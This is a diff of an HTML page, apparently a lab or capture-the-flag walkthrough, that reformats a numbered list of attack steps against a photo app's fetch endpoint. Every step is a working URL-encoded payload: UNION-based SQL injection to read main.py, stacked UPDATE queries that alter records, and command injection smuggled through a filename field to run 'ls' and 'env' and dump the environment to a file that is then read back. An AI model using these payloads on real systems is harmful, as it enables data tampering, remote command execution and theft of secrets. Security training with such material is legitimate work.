@@ -13,34 +13,33 @@
     <ol>
         <li>
             <p>
-                Check
-                <u>*/fetch?id=0%20union%20select%20%27main.py%27</u>
+                Check <b><code>*/fetch?id=0%20union%20select%20%27main.py%27</code></b>
                 <br>
                 for the <b>photo</b> table query patern.
             </p>
         </li>
         <li>
             <p>
-                For changing title in database insert this query <br>
-                <u>*/fetch?id=1<b>;%20UPDATE%20photos%20%20SET%20title=%22test%22%20WHERE%20id=3;%20commit;</b></u>
+                For changing title in database insert this query: <br>
+                <pre>*/fetch?id=1;%20UPDATE%20photos%20%20SET%20title=%22test%22%20WHERE%20id=3;%20commit;</pre>
             </p>
         </li>
         <li>
             <p>
-                Gather list of the files in the project directory <br>
-                <u>*/fetch?id=1<b>;%20UPDATE%20photos%20%20SET%20filename=%22*%20||%20ls%20./files%3Etest.txt%22%20WHERE%20id=3;%20commit;</b></u>
+                Gather list of the files in the project directory: <br>
+                <pre>*/fetch?id=1;%20UPDATE%20photos%20%20SET%20filename=%22*%20||%20ls%20./files%3Etest.txt%22%20WHERE%20id=3;%20commit;</pre>
             </p>
         </li>
         <li>
             <p>
                 Gather the project enviroment and store them in a file we created <br>
-                <u>*/fetch?id=1<b>;%20UPDATE%20photos%20%20SET%20filename=%22*%20||%20env%3Etest.txt%22%20WHERE%20id=3;%20commit;</b></u>
+                <pre>*/fetch?id=1;%20UPDATE%20photos%20%20SET%20filename=%22*%20||%20env%3Etest.txt%22%20WHERE%20id=3;%20commit;</pre>
             </p>
         </li>
         <li>
             <p>
                 Extract the project enviroment information
-                <u>*/fetch?id=1<b>.1%20UNION%20SELECT%20%22test.txt%22</b></u>
+                <pre>*/fetch?id=1.1%20UNION%20SELECT%20%22test.txt%22</pre>
             </p>
         </li>
     </ol>
